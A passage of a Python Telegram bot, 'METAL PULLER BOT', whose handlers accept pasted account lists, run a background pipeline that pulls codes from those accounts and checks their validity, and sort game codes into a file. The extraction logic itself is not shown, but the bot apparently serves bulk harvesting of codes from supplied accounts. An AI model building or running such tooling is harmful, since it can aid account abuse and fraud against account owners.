    asyncio.create_task(live_results_monitoring_loop(monitoring_msg, task_id, "check_validation"))

@dp.message(BotStates.waiting_for_accounts_check_only)
async def process_check_only_input(message: types.Message, state: FSMContext):
    accs = parse_accounts_data(message.text)
    if not accs:
        await message.reply("❌ Critical error parsing account context strings.")
        return
        
    await state.clear()
    task_id = str(uuid.uuid4())[:8]
    ACTIVE_TASKS[task_id] = {
        "start_time": time.time(),
        "is_running": True,
        "stop_requested": False,
        "status_msg": "Initializing pulling configuration parameters...",
        "total_pulled_accounts": 0,
        "total_pulled_codes": 0,
        "total_checked_codes": 0,
        "valid_list": []
    }
    
    monitoring_msg = await message.reply("📥 <b>Spawning code extractor instances...</b>", parse_mode="HTML")
    
    threading.Thread(target=execute_check_only_pipeline, args=(task_id, accs)).start()
    asyncio.create_task(live_results_monitoring_loop(monitoring_msg, task_id, "check_only"))

@dp.message(BotStates.waiting_for_codes_to_sort)
async def process_sorting_input(message: types.Message, state: FSMContext):
    await state.clear()
    lines = message.text.split('\n')
    game_groups = {}
    
    for line in lines:
        line = line.strip()
        if not line: continue
        if '|' in line:
            code, game_name = line.split('|', 1)
            code = code.strip()
            game_name = game_name.strip()
            gtype = extract_game_type(game_name)
            if gtype not in game_groups: game_groups[gtype] = []
            game_groups[gtype].append((code, game_name))
        else:
            if 'Other' not in game_groups: game_groups['Other'] = []
            game_groups['Other'].append((line, 'Unknown Offer'))
            
    formatted_data = format_game_codes_output(game_groups)
    timestamp = datetime.now().strftime("%Y%m%d")
    
    file_bytes = formatted_data.encode('utf-8')
    input_file = BufferedInputFile(file_bytes, filename=f"sortedcodes_{timestamp}.txt")
    
    await message.reply_document(document=input_file, caption=f"🔮 Sorted manifest package processed safely.")

# ============================================================================
# RUN-LOOP EXECUTION TRIGGER
# ============================================================================
async def main():
    print("==================================================")
    print("🚀 METAL PULLER BOT SERVICE LAYER INITIALIZING")
    print(f"📡 Target Server Platform Instance Year: {datetime.now().year}")
    print("==================================================")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("\n🛑 Execution processes stopped securely.")

